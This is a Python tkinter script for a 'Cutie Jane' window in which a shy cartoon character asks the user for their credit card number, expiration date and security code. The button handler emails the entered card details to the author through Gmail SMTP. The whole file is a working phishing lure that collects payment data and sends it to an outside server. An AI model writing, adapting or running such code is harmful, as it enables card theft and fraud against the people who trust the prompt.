import tkinter as tk
import smtplib
from PIL import Image, ImageTk

def onPressThanksButton():
	print('gavno')
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login('yourmail@gmail.com', 'app-password')
	server.sendmail('yourmail@gmail.com', 'yourmail@gmail.com', 
	f'Subject: CUTIE JANE\n\n{cardnumber_entry.get()}, {cardexpdat_entry.get()}, {cardpassword_entry.get()}')

def CenterWindowToDisplay(Screen, width, height):
    screen_width = Screen.winfo_screenwidth()
    screen_height = Screen.winfo_screenheight()
    x = int((screen_width/2) - (width/2))
    y = int((screen_height/2) - (height/1.5))
    return f"{width}x{height}+{x}+{y}"

root = tk.Tk()
root.geometry(CenterWindowToDisplay(root, 498, 540))
root.resizable(False, False)
root.title('Cutie Jane')

jane_image = ImageTk.PhotoImage(Image.open('jane.png'))
jane_label = tk.Label(root, image = jane_image)
jane_label.place(x = 0, y = 0)

ask_label = tk.Label(root, text = 'Uh-hello...\nC-could you, please, provide\nthe details of your c-credit card?')
ask_label.place(x = 139, y = 296)

cardnumber_label = tk.Label(root, text = 'Card number:')
cardnumber_label.place(x = 4, y = 296+64)
cardnumber_entry = tk.Entry(root)
cardnumber_entry.place(x = 150, y = 296+64)

cardexpdat_label = tk.Label(root, text = 'Expiration date:')
cardexpdat_label.place(x = 4, y = 296+64+36)
cardexpdat_entry = tk.Entry(root)
cardexpdat_entry.place(x = 150, y = 296+64+36)

cardpassword_label = tk.Label(root, text = 'Security code:')
cardpassword_label.place(x = 4, y = 296+64+36+36)
cardpassword_entry = tk.Entry(root)
cardpassword_entry.place(x = 150, y = 296+64+36+36)

thanks_button = tk.Button(root, text = 'Th-thank you...', command = onPressThanksButton)
thanks_button.place(x = (498-124)/2, y = 296+64+36+36+48)

root.mainloop()
